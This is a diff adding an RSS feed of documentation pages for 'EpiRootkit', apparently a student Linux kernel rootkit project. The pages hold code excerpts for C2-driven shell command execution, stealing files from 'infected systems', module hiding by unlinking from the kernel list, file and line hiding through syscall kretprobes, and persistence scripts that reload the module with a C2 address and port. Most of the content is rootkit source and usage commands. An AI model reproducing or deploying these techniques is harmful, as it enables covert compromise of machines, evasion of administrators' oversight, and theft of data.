@@ -1,0 +1,621 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Features on Tux Fan Club Docs</title><link>/docs/05-epirootkit/features/</link><description>Recent content in Features on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 13 Aug 2026 11:34:54 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/features/index.xml" rel="self" type="application/rss+xml"/><item><title>Command Execution</title><link>/docs/05-epirootkit/features/command-execution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/command-execution/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="9b8da5c" class="language-c ">
+ &lt;code>int handle_exec(const char *data)
+{
+ char *argv[] = { &amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, NULL, NULL };
+ char *envp[] = { 
+ &amp;#34;HOME=/&amp;#34;, 
+ &amp;#34;PATH=/sbin:/bin:/usr/bin:/usr/local/bin&amp;#34;, 
+ &amp;#34;TERM=linux&amp;#34;,
+ NULL 
+ };
+ 
+ // Redirect output to temp file
+ snprintf(full_command, strlen(data) &amp;#43; strlen(temp_filename) &amp;#43; 32,
+ &amp;#34;%s &amp;gt; %s 2&amp;gt;&amp;amp;1&amp;#34;, data, temp_filename);
+ 
+ argv[2] = full_command;
+ 
+ // Execute command
+ ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+ 
+ // Read output and send back
+ return send_result(result_buffer);
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Uses shell execution with output redirection to temporary files for result capture.&lt;/p></description></item><item><title>DNS Resolution</title><link>/docs/05-epirootkit/features/dns-resolution/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/dns-resolution/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="482c6f0" class="language-c ">
+ &lt;code>#define DNS_SERVER_IP 0x08080808 /* 8.8.8.8 */
+#define DNS_PORT 53
+#define DNS_QUERY_ID 0x1234
+
+int kernel_dns_resolve(const char *hostname, u32 *ip_addr)
+{
+ // Create UDP socket
+ sock_create_kern(&amp;amp;init_net, AF_INET, SOCK_DGRAM, IPPROTO_UDP, &amp;amp;sock);
+ 
+ // Build DNS query
+ hdr-&amp;gt;id = htons(DNS_QUERY_ID);
+ hdr-&amp;gt;flags = htons(0x0100);
+ hdr-&amp;gt;qdcount = htons(1);
+ 
+ // Send query to 8.8.8.8:53
+ kernel_sendmsg(sock, &amp;amp;msg, &amp;amp;iov, 1, query_len);
+ 
+ // Parse A record response
+ return parse_dns_response(response, ret, ip_addr);
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Builds standard DNS queries and parses A record responses using Google DNS (8.8.8.8).&lt;/p></description></item><item><title>Encryption</title><link>/docs/05-epirootkit/features/encryption/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/encryption/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="b0f4404" class="language-c ">
+ &lt;code>/* XOR key (32 bytes) */
+static const u8 XOR_KEY[] = {
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef,
+ 0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef
+};
+
+static void xor_crypt(const u8 *input, u8 *output, size_t length)
+{
+ for (i = 0; i &amp;lt; length; i&amp;#43;&amp;#43;) {
+ output[i] = input[i] ^ XOR_KEY[i % XOR_KEY_SIZE];
+ }
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>XOR cipher with key rotation - same operation for encryption and decryption.&lt;/p></description></item><item><title>Sysfs Interface</title><link>/docs/05-epirootkit/features/sysfs-interface/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/sysfs-interface/</guid><description>&lt;h1 id="sysfs-interface">Sysfs Interface &lt;a href="#sysfs-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Two-step interface using group file permissions to control rootkit features.&lt;/p>
+&lt;h2 id="how-it-works">How It Works &lt;a href="#how-it-works" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Like git, changes require two steps:&lt;/p>
+&lt;ol>
+&lt;li>&lt;strong>Stage change&lt;/strong> (&lt;code>chmod&lt;/code>) - like &lt;code>git commit&lt;/code>&lt;/li>
+&lt;li>&lt;strong>Apply change&lt;/strong> (&lt;code>cat&lt;/code>/&lt;code>echo&lt;/code>) - like &lt;code>git push&lt;/code>&lt;/li>
+&lt;/ol>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="91e93ba" class="language-bash ">
+ &lt;code>chmod 670 /sys/kernel/epirootkit/control # Stage features (group rwx)
+cat /sys/kernel/epirootkit/control # Apply changes&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="permission-mapping">Permission Mapping &lt;a href="#permission-mapping" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Group permission bits control features:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>Bit 1&lt;/strong> (group execute): Module hiding&lt;/li>
+&lt;li>&lt;strong>Bit 2&lt;/strong> (group write): File hiding&lt;/li>
+&lt;li>&lt;strong>Bit 4&lt;/strong> (group read): Line hiding&lt;/li>
+&lt;/ul>
+&lt;h2 id="usage-examples">Usage Examples &lt;a href="#usage-examples" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="19f1622" class="language-bash ">
+ &lt;code># Enable all features
+chmod 670 /sys/kernel/epirootkit/control # Stage: group rwx (7)
+cat /sys/kernel/epirootkit/control # Apply
+
+# Enable only module hiding 
+chmod 610 /sys/kernel/epirootkit/control # Stage: group --x (1)
+echo &amp;#34;apply&amp;#34; &amp;gt; /sys/kernel/epirootkit/control # Apply
+
+# Disable everything
+chmod 600 /sys/kernel/epirootkit/control # Stage: group --- (0)
+cat /sys/kernel/epirootkit/control # Apply&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="feature-combinations">Feature Combinations &lt;a href="#feature-combinations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th style="text-align: center">chmod&lt;/th>
+ &lt;th style="text-align: center">Group&lt;/th>
+ &lt;th style="text-align: center">Module&lt;/th>
+ &lt;th style="text-align: center">Files&lt;/th>
+ &lt;th style="text-align: center">Lines&lt;/th>
+ &lt;th style="text-align: left">Description&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td style="text-align: center">600&lt;/td>
+ &lt;td style="text-align: center">&amp;mdash;&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">All disabled&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">610&lt;/td>
+ &lt;td style="text-align: center">&amp;ndash;x&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Module only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">620&lt;/td>
+ &lt;td style="text-align: center">-w-&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Files only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">630&lt;/td>
+ &lt;td style="text-align: center">-wx&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: left">Module + files&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">640&lt;/td>
+ &lt;td style="text-align: center">r&amp;ndash;&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Lines only&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">650&lt;/td>
+ &lt;td style="text-align: center">r-x&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Module + lines&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">660&lt;/td>
+ &lt;td style="text-align: center">rw-&lt;/td>
+ &lt;td style="text-align: center">❌&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">Files + lines&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td style="text-align: center">670&lt;/td>
+ &lt;td style="text-align: center">rwx&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: center">✅&lt;/td>
+ &lt;td style="text-align: left">All enabled&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="status-output">Status Output &lt;a href="#status-output" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="89f3e25" class="language-bash ">
+ &lt;code>cat /sys/kernel/epirootkit/control&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>Example:&lt;/strong>&lt;/p></description></item><item><title>Module Hiding</title><link>/docs/05-epirootkit/features/module-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/module-hiding/</guid><description>&lt;h1 id="module-hiding">Module Hiding &lt;a href="#module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Hide the rootkit module from &lt;code>lsmod&lt;/code> and &lt;code>/proc/modules&lt;/code> by removing it from the kernel&amp;rsquo;s module list.&lt;/p>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="a8a53af" class="language-c ">
+ &lt;code>int hide_module(void)
+{
+ if (module_hiding_state.hidden)
+ return 0;
+
+ module_hiding_state.prev_module_entry = THIS_MODULE-&amp;gt;list.prev;
+ list_del(&amp;amp;THIS_MODULE-&amp;gt;list);
+ module_hiding_state.hidden = true;
+ 
+ return 0;
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Removes the module from kernel&amp;rsquo;s linked list using &lt;code>list_del()&lt;/code> while saving the previous entry for restoration.&lt;/p>
+
+&lt;div class="alert alert-warning d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ &lt;span class="material-icons size-20 me-2">
+ warning
+ &lt;/span>&lt;/div>
+ 
+ &lt;div class="w-100">&lt;p>The &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/05-epirootkit/features/line-hiding/'>&lt;p>FEATURES&lt;/p>&lt;strong>Line Hiding&lt;/strong>&lt;br>Hide rootkit lines from file contents using syscall interception&lt;/a>" data-bs-toggle="tooltip" href="/docs/05-epirootkit/features/line-hiding/">Line Hiding&lt;/a> also hides the module from &lt;code>/proc/modules&lt;/code> so to test module visibility with lsmod, you must disable line hiding.&lt;/p></description></item><item><title>File Hiding</title><link>/docs/05-epirootkit/features/file-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-hiding/</guid><description>&lt;div class="alert alert-warning d-flex" role="alert">
+ &lt;div class="flex-shrink-1 alert-icon">
+ 
+ &lt;span class="material-icons size-20 me-2">
+ warning
+ &lt;/span>&lt;/div>
+ 
+ &lt;div class="w-100">It&amp;rsquo;s Tuesday 17/06 21:26, two hours before deadline, and I&amp;rsquo;m realizing just now that even with file hiding enabled, the directory &lt;code>/sys/module/epirootkit&lt;/code> is still visible in the victim&amp;rsquo;s system. This occurs because we only hook getdents while &lt;code>/sys/module/epirootkit&lt;/code> uses sysfs.&lt;/div>
+ &lt;/div>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="48d1e6b" class="language-c ">
+ &lt;code>static const char * const hide_prefixes[] = { 
+ &amp;#34;epirootkit&amp;#34;,
+ &amp;#34;jules_est_bo_&amp;#34;, 
+};
+
+file_hiding_state.getdents_probe = (struct kretprobe) {
+ .kp.symbol_name = &amp;#34;ksys_getdents64&amp;#34;,
+ .handler = getdents64_ret_handler,
+ .entry_handler = getdents64_entry_handler,
+ .data_size = sizeof(struct getdents_context),
+ .maxactive = 20
+};&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Hooks &lt;code>ksys_getdents64&lt;/code> syscall and filters directory entries matching hidden prefixes.&lt;/p></description></item><item><title>Persistence</title><link>/docs/05-epirootkit/features/persistence/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/persistence/</guid><description>&lt;h2 id="modules-loadd-method">modules-load.d Method &lt;a href="#modules-loadd-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Modules are&lt;/p>
+&lt;p>Creates two files:&lt;/p>
+&lt;p>&lt;strong>&lt;code>/etc/modules-load.d/jules_est_bo_system.conf&lt;/code>&lt;/strong>:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d737ac6" class="language-bash ">
+ &lt;code># EpiRootkit module
+epirootkit&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>&lt;strong>&lt;code>/etc/modprobe.d/jules_est_bo_modprobe.conf&lt;/code>&lt;/strong>:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d93b2d0" class="language-bash ">
+ &lt;code># EpiRootkit module parameters
+options epirootkit address=192.168.200.11 port=4444&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="shell-profile-method">Shell Profile Method &lt;a href="#shell-profile-method" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Creates &lt;code>/etc/profile.d/jules_est_bo_env.sh&lt;/code>:&lt;/p>
+
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d602ff9" class="language-bash ">
+ &lt;code>#!/bin/bash
+# System environment initialization
+if [ &amp;#34;$(id -u)&amp;#34; -eq 0 ]; then
+ # Check if module is already loaded via proc filesystem
+ if [ ! -f /sys/kernel/epirootkit/control ] &amp;amp;&amp;amp; ! grep -q &amp;#34;^epirootkit &amp;#34; /proc/modules 2&amp;gt;/dev/null; then
+ modprobe epirootkit address=192.168.200.11 port=4444 2&amp;gt;/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko address=192.168.200.11 port=4444 2&amp;gt;/dev/null
+ fi
+fi&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="commands">Commands &lt;a href="#commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="81faea4" class="language-bash ">
+ &lt;code>persist # Install both methods
+persist_remove # Remove all
+status # Check status&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="testing">Testing &lt;a href="#testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="7d2b85f" class="language-bash ">
+ &lt;code>sudo insmod epirootkit.ko address=192.168.200.11 port=4444
+# Install persistence via C2/WebUI command: persist
+sudo reboot
+lsmod | grep epirootkit&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="status-response">Status Response &lt;a href="#status-response" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="373f359" class="language-json ">
+ &lt;code>{
+ &amp;#34;persistence&amp;#34;: {
+ &amp;#34;enabled&amp;#34;: true,
+ &amp;#34;methods&amp;#34;: {
+ &amp;#34;modules_load&amp;#34;: {
+ &amp;#34;active&amp;#34;: true, 
+ &amp;#34;files&amp;#34;: {
+ &amp;#34;modules_load&amp;#34;: &amp;#34;/etc/modules-load.d/jules_est_bo_system.conf&amp;#34;,
+ &amp;#34;modprobe&amp;#34;: &amp;#34;/etc/modprobe.d/jules_est_bo_modprobe.conf&amp;#34;
+ }
+ },
+ &amp;#34;shell_profile&amp;#34;: {
+ &amp;#34;active&amp;#34;: true, 
+ &amp;#34;path&amp;#34;: &amp;#34;/etc/profile.d/jules_est_bo_env.sh&amp;#34;
+ }
+ }
+ }
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="file-naming">File Naming &lt;a href="#file-naming" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;strong>modules-load.d&lt;/strong>: Uses &lt;code>jules_est_bo_&lt;/code> prefix for stealth (matches file hiding pattern)&lt;/li>
+&lt;li>&lt;strong>modprobe.d&lt;/strong>: Uses &lt;code>jules_est_bo_&lt;/code> prefix for stealth consistency&lt;/li>
+&lt;li>&lt;strong>profile.d&lt;/strong>: Uses &lt;code>jules_est_bo_&lt;/code> prefix for stealth&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Reliable, standards-compliant persistence with consistent stealth naming.&lt;/strong>&lt;/p></description></item><item><title>Line Hiding</title><link>/docs/05-epirootkit/features/line-hiding/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/line-hiding/</guid><description>&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="c7b1768" class="language-c ">
+ &lt;code>static const char * const hide_line_patterns[] = {
+ &amp;#34;epirootkit&amp;#34;,
+ &amp;#34;jules_est_bo_&amp;#34;,
+ &amp;#34;EpiRootkit&amp;#34;,
+ &amp;#34;modprobe epirootkit&amp;#34;,
+ &amp;#34;insmod epirootkit&amp;#34;
+};
+
+// Target directories
+&amp;#34;/etc/cron.d/&amp;#34;
+&amp;#34;/etc/modules-load.d/&amp;#34;
+&amp;#34;/etc/profile.d/&amp;#34;
+&amp;#34;/proc/modules&amp;#34;&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Hooks &lt;code>ksys_read&lt;/code> syscall and filters lines containing rootkit patterns from target files.&lt;/p>
+&lt;h2 id="module-hiding-complement">Module Hiding Complement &lt;a href="#module-hiding-complement" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Module Hiding&lt;/strong>: Removes module from kernel list (affects &lt;code>lsmod&lt;/code>)&lt;br>
+&lt;strong>Line Hiding&lt;/strong>: Filters &lt;code>/proc/modules&lt;/code> content when read&lt;/p>
+&lt;p>Combined, they provide comprehensive module stealth.&lt;/p>
+&lt;h2 id="testing">Testing &lt;a href="#testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="258fb2b" class="language-bash ">
+ &lt;code># Test with provided file
+sudo cp test_line_hiding_epirootkit.txt /etc/cron.d/test_epirootkit
+cat /etc/cron.d/test_epirootkit
+# Result: 24 lines → ~9 lines (rootkit patterns filtered)
+
+# Test module information
+cat /proc/modules | grep epirootkit
+# Output: (nothing when line hiding active)&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="control">Control &lt;a href="#control" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="webui">WebUI &lt;a href="#webui" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Toggle via &lt;strong>&lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/04-web-ui/features/panels/configuration-panel/'>&lt;p>UI PANELS&lt;/p></description></item><item><title>File Transfer</title><link>/docs/05-epirootkit/features/file-transfer/</link><pubDate>Fri, 30 May 2025 00:00:00 +0100</pubDate><guid>/docs/05-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="file-transfer">File Transfer &lt;a href="#file-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Bidirectional file transfer between C2 server and infected systems using base64 encoding.&lt;/p>
+&lt;h2 id="implementation">Implementation &lt;a href="#implementation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="upload-to-target">Upload to Target &lt;a href="#upload-to-target" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="d56abfe" class="language-javascript ">
+ &lt;code>// Server side (attacking_program)
+function uploadFile(clientId, localPath, remotePath) {
+ const fileBuffer = fs.readFileSync(localPath);
+ const base64Content = fileBuffer.toString(&amp;#39;base64&amp;#39;);
+ 
+ return sendCommand(clientId, &amp;#39;UPLOAD&amp;#39;, {
+ filename: remotePath,
+ content: base64Content,
+ encoding: &amp;#39;base64&amp;#39;
+ });
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="download-from-target">Download from Target &lt;a href="#download-from-target" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="b6675f1" class="language-c ">
+ &lt;code>// Rootkit side (file_commands.c)
+int handle_download(const char *data)
+{
+ file = filp_open(filepath, O_RDONLY, 0);
+ bytes_read = kernel_read(file, file_buffer, file_size, &amp;amp;pos);
+ 
+ // Base64 encode and send
+ base64_encode(file_buffer, file_size, encoded_buffer, &amp;amp;encoded_size);
+ return send_result(encoded_buffer);
+}&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;p>Files are encoded in base64 for JSON protocol compatibility.&lt;/p></description></item></channel></rss>
